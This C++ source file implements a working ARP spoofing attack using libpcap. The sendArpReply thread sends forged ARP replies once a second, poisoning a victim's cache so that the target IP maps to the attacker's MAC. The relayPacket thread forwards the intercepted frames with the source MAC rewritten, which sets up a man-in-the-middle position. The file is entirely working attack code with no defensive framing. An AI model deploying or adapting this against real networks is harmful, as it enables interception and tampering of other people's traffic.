#include "attack.h"

void *sendArpReply(void *args) {
    SendArpReplyArgs *send_arp_reply_args = (SendArpReplyArgs *)args;
    volatile bool *running = send_arp_reply_args->running;
    char *dev = send_arp_reply_args->dev;
    Mac *attacker_mac = send_arp_reply_args->attacker_mac;
    Ip *attacker_ip = send_arp_reply_args->attacker_ip;
    Mac *sender_mac = send_arp_reply_args->sender_mac;
    Ip *sender_ip = send_arp_reply_args->sender_ip;
    Ip *target_ip = send_arp_reply_args->target_ip;

    EthArpPacket packet;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return NULL;
    }

    packet.eth_.dmac_ = *sender_mac;
    packet.eth_.smac_ = *attacker_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = *attacker_mac;
    packet.arp_.sip_ = htonl(*target_ip);
    packet.arp_.tmac_ = *sender_mac;
    packet.arp_.tip_ = htonl(*sender_ip);

    while (*running) {
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            pcap_close(handle);
            return NULL;
        }
        sleep(1);
    }

    pcap_close(handle);
    return NULL;
}

void *relayPacket(void *args) {
    RelayPacketArgs *relay_packet_args = (RelayPacketArgs *)args;
    volatile bool *running = relay_packet_args->running;
    char *dev = relay_packet_args->dev;
    Mac *attacker_mac = relay_packet_args->attacker_mac;
    Mac *sender_mac = relay_packet_args->sender_mac;
    // Mac *target_mac = relay_packet_args->target_mac;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return NULL;
    }

    while (*running) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return NULL;
        }

        EthHdr* eth = (EthHdr*)packet;
        if (eth->smac_ == *sender_mac || eth->dmac_ == *sender_mac) {
            eth->smac_ = *attacker_mac;
            int res = pcap_sendpacket(handle, packet, header->caplen);
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                return NULL;
            }
        }
    }

    pcap_close(handle);
    return NULL;
}